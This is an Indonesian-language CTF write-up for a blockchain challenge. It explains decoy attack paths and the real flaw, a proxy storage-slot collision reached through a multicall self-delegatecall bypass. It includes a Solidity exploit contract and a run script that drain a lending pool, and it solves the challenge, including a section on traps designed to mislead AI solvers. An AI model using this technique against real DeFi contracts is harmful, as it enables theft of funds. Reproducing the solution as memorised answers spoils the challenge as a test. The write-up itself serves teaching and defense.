# The Timekeeper's Paradox — Writeup Resmi (Bahasa Indonesia)

**Kategori:** Blockchain + Forensik/OSINT  
**Difficulty:** Hard  
**Flag:** `COMPFEST18{...}` (dinamis per instance)

---

## Deskripsi Challenge

> *The Timekeeper Protocol adalah generasi terbaru dari decentralized lending. Dengan oracle TWAP yang battle-tested, governance-controlled upgrades, dan sistem proxy yang sudah diaudit, kami yakin tidak ada yang bisa membobolnya. Kami bahkan punya flashloan untuk efisiensi modal maksimal!*
>
> **Misi:** Kuras semua 50 ETH dari TimekeeperLending pool.

### Apa yang Diberikan ke Peserta

- Source code 6 kontrak (Setup, Token, Oracle, Proxy, Lending, Governance)
- 5 ETH untuk gas
- 10,000 TKG governance token (≈1.1% dari total supply)
- Lending pool berisi 50 ETH

---

## Langkah 1: Memahami Ekosistem

Challenge ini berbeda dari biasanya karena ada **6 kontrak** yang saling terhubung:

```
TimekeeperToken (ERC20)  →  Governance (DECOY)
                              │
TimekeeperOracle (harga) →  TimekeeperProxy (delegatecall)
                              │
                           TimekeeperLending (50 ETH)
```

**Goal:** `address(lending).balance == 0`

Ini mensimulasikan ekosistem DeFi nyata lengkap dengan semua komponen-nya.

---

## Langkah 2: Identifikasi Decoy

### ❌ Decoy 1: Flashloan → Manipulasi Oracle

Lending pool punya function `flashloan()`. Pola serangan DeFi paling klasik:

```
Ambil flashloan → Manipulasi harga → Borrow dengan harga palsu → Bayar flashloan → Profit
```

**Analisis mengapa GAGAL:**

Oracle mengimplementasikan **TWAP** (Time-Weighted Average Price):

```solidity
uint256 public constant MIN_OBSERVATION_WINDOW = 30 minutes;

function consultTWAP(uint256 period) external view returns (uint256) {
    require(period >= MIN_OBSERVATION_WINDOW, "Period too short");
    // Menghitung rata-rata harga tertimbang waktu dari data historis
}
```

- Flashloan terjadi dalam 1 block (±12 detik)
- TWAP membutuhkan minimal 30 menit data historis
- Manipulasi harga 1 block nyaris tidak berpengaruh ke rata-rata 30 menit
- Ini defense mechanism yang sama dipakai **Uniswap V2/V3** di mainnet

**Tapi tunggu...** lending pool sebenarnya memanggil `getLatestPrice()`, bukan `consultTWAP()`. Ini petunjuk penting yang akan kita perlukan nanti.

### ❌ Decoy 2: Governance Takeover

Governance contract punya fungsi-fungsi yang menggoda:

```solidity
function setOracleReporter(address newReporter) external {
    require(msg.sender == address(this), "Only governance");
    // Bisa ganti reporter oracle!
}

function upgradeProxy(address newImplementation) external {
    require(msg.sender == address(this), "Only governance");
    // Bisa upgrade proxy!
}
```

Kalau bisa pass proposal governance, kita bisa:
- Ganti reporter oracle → set harga sesuka kita
- Upgrade proxy → inject kode jahat

**Analisis mengapa GAGAL:**

```solidity
uint256 public constant QUORUM_BPS = 5100;   // 51% dari total supply
uint256 public constant TIMELOCK = 7 days;     // 7 hari tunggu setelah quorum!
```

- Kita hanya punya 10,000 TKG (≈1.1% dari supply total ≈910,000 TKG)
- Butuh 51% = ≈464,000 TKG untuk pass proposal — **mustahil**
- Bahkan kalau somehow kita punya cukup token, harus tunggu **7 hari** timelock
- Instance CTF hanya bertahan **30 menit** — timelock tidak akan pernah expire

### ❌ Decoy 3: Upgrade Proxy via delegatecall

Proxy punya `upgradeTo()`:

```solidity
function upgradeTo(address newImplementation) external {
    require(msg.sender == admin, "Only admin");
    require(validImplementations[newImplementation], "Invalid implementation");
    implementation = newImplementation;
}
```

**Analisis mengapa GAGAL:**
- `admin` adalah Setup contract — bukan kita
- Implementation baru harus terdaftar di `validImplementations` — hanya admin yang bisa register
- Double protection: admin check + registry check

---

## Langkah 3: Deep Dive — Menemukan Vulnerability Asli

Setelah menyingkirkan 3 decoy, saatnya analisis lebih dalam. Kunci-nya ada di **bagaimana proxy berinteraksi dengan oracle melalui delegatecall**.

### Vulnerability Inti: Storage Slot Collision

#### Memahami `delegatecall`

`delegatecall` menjalankan kode kontrak lain **dalam konteks storage pemanggil**. Artinya:
- **Kode** yang dijalankan = kode oracle
- **Storage** yang dibaca/tulis = storage **proxy** (bukan oracle!)

#### Menganalisis Storage Layout

**TimekeeperProxy:**
| Slot | Variable | Tipe | Nilai |
|------|----------|------|-------|
| 0 | `admin` | `address` | alamat Setup |
| 1 | `implementation` | `address` | alamat Oracle |
| **2** | **`pendingAdmin`** | **`address`** | `address(0)` awalnya |

**TimekeeperOracle:**
| Slot | Variable | Tipe | Nilai |
|------|----------|------|-------|
| 0 | `admin` | `address` | alamat deployer |
| 1 | `reporter` | `address` | alamat reporter |
| **2** | **`latestPrice`** | **`uint256`** | `1000e18` awalnya |

**COLLISION!** Slot 2 proxy (`pendingAdmin`) bertabrakan dengan slot 2 oracle (`latestPrice`)!

#### Apa Dampaknya?

```
Lending Pool memanggil:
    proxy.getLatestPrice()
        │
        ▼ (proxy fallback → delegatecall ke oracle)
    Oracle code: function getLatestPrice() { return latestPrice; }
        │                                           │
        │                              reads slot 2 │
        ▼                                           ▼
    Tapi storage context = PROXY!
    Slot 2 proxy = pendingAdmin
        │
        ▼
    Return: pendingAdmin (address) diinterpretasi sebagai uint256
```

**Jika kita bisa mengubah `pendingAdmin` ke nilai yang sangat besar, oracle akan mengembalikan harga yang sangat tinggi!**

### Bypass: Multicall Self-Call

Masalahnya: `setPendingAdmin()` dilindungi:

```solidity
function setPendingAdmin(address _pendingAdmin) external {
    require(msg.sender == address(this), "Only self");  // ← Hanya proxy sendiri!
    pendingAdmin = _pendingAdmin;
}
```

Tapi proxy punya `multicall()`:

```solidity
function multicall(bytes[] calldata data) external returns (bytes[] memory) {
    for (uint256 i = 0; i < data.length; i++) {
        (bool success, bytes memory result) = address(this).delegatecall(data[i]);
        //                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
        //                                   delegatecall ke diri sendiri!
    }
}
```

**Analisis semantik:**

Saat proxy menjalankan `address(this).delegatecall(data)`:
1. `address(this)` = alamat proxy
2. Di dalam delegatecall, `msg.sender` = alamat proxy (yang memanggil delegatecall)
3. Di dalam delegatecall, `address(this)` = alamat proxy (tidak berubah)
4. Check: `msg.sender == address(this)` → `proxy == proxy` → **TRUE!** ✅

**Artinya: siapapun bisa panggil `multicall` untuk memanggil `setPendingAdmin` dengan nilai apapun!**

---

## Langkah 4: Membangun Exploit

### Kontrak Exploit

```solidity
contract Exploit {
    ITimekeeperProxy public proxy;
    ITimekeeperLending public lending;
    IERC20 public token;

    function exploit() external {
        // === TAHAP 1: Manipulasi Harga via Storage Collision ===
        
        // Set pendingAdmin ke address(type(uint160).max) = 0xFFFF...FFFF
        // Ini menulis 2^160 - 1 ≈ 1.46 × 10^48 ke slot 2
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(
            ITimekeeperProxy.setPendingAdmin.selector,
            address(type(uint160).max)
        );
        proxy.multicall(calls);
        
        // Sekarang getLatestPrice() return 1.46 × 10^48!
        
        // === TAHAP 2: Deposit Token, Borrow Semua ETH ===
        
        // Dengan harga segitu, 10,000 TKG punya borrowing power 
        // yang jauh melebihi 50 ETH
        uint256 tokenBal = token.balanceOf(address(this));
        token.approve(address(lending), tokenBal);
        lending.depositToken(tokenBal);
        
        // Borrow semua ETH dari pool
        lending.borrowETH(lending.poolETHBalance());
        
        // === TAHAP 3: Kirim ETH ke Attacker ===
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

### Alur Exploit Lengkap

```
   AWAL:
   ┌───────────────┐
   │ Lending Pool   │ = 50 ETH
   │ Oracle Price   │ = 1000 TKG/ETH (normal)
   │ Proxy Slot 2   │ = 0x0 (pendingAdmin kosong)
   │ Player Token   │ = 10,000 TKG
   └───────────────┘
           │
           ▼
   STEP 1: proxy.multicall([setPendingAdmin(0xFFFF...F)])
   ┌───────────────┐
   │ Proxy Slot 2   │ = 0xFFFFFFFFFFFFFFFF... (address besar)
   │ getLatestPrice │ = 1.46 × 10^48 (MANIPULASI!)
   └───────────────┘
           │
           ▼
   STEP 2: lending.depositToken(10,000 TKG)
   ┌───────────────┐
   │ Collateral     │ = 10,000 TKG
   │ Borrowing Power│ = TRILIUNAN ETH (harga inflasi)
   └───────────────┘
           │
           ▼
   STEP 3: lending.borrowETH(50 ETH)
   ┌───────────────┐
   │ Lending Pool   │ = 0 ETH ← KOSONG!
   │ Player ETH     │ = 50 ETH + 5 ETH
   └───────────────┘
           │
           ▼
   isSolved() = true → FLAG! 🚩
```

---

## Langkah 5: Eksekusi

```python
# 1. Deploy exploit contract
exploit = deploy_contract("Exploit", proxy_addr, lending_addr, token_addr)

# 2. Transfer token ke exploit contract  
token.transfer(exploit.address, 10_000 * 10**18)

# 3. Jalankan exploit
exploit.exploit()

# 4. Cek solusi
assert setup.isSolved() == True  # ✅
flag = get_flag()  # 🚩
```

---

## Mengapa Challenge Ini Sulit untuk AI

1. **Search space besar** — 6 kontrak dengan ratusan baris kode, AI kewalahan menganalisis semuanya
2. **Flashloan trap sempurna** — AI pasti mencoba serangan flashloan dulu (pola DeFi paling terkenal)
3. **Governance trap** — Fungsi `setOracleReporter()` dan `upgradeProxy()` sangat menggoda
4. **Storage analysis = forensik** — Menghitung posisi slot storage butuh pemahaman EVM internals
5. **delegatecall semantics** — Memahami storage context switching itu nuanced
6. **Multicall trick sangat subtle** — `address(this).delegatecall` yang bypass self-call check jarang ditemui

---

## Pelajaran Penting

### 1. Storage Layout di Proxy Harus Didesain Hati-hati
Collision antara `pendingAdmin` (slot 2) dan `latestPrice` (slot 2) adalah bug klasik proxy. **Solusi:** Gunakan EIP-1967 storage slots untuk SEMUA state proxy-specific.

### 2. Pattern `multicall` Berbahaya
Self-delegatecall dalam multicall bisa bypass access control yang membandingkan `msg.sender` dengan `address(this)`. **Solusi:** Jangan gabungkan multicall dengan self-call restrictions, atau gunakan check tambahan.

### 3. Jangan Campur Named dan Regular Storage Slots
Oracle punya `PRICE_SLOT` (named/aman) DAN `latestPrice` (regular/rentan). Lending pool malah pakai `getLatestPrice()` yang baca regular slot. **Solusi:** Konsisten gunakan satu mekanisme storage.

### 4. Defense in Depth untuk Oracle
Meskipun ada TWAP, kalau harga bisa dimanipulasi lewat vektor lain (storage collision), semua proteksi percuma. **Solusi:** Keamanan oracle harus mempertimbangkan seluruh call chain, termasuk proxy.

---

## Referensi

- [EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)
- [OpenZeppelin: Proxy Patterns](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
- [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)
- [Paradigm CTF — Foundry Challenges](https://github.com/paradigmxyz/paradigm-ctf-infrastructure)
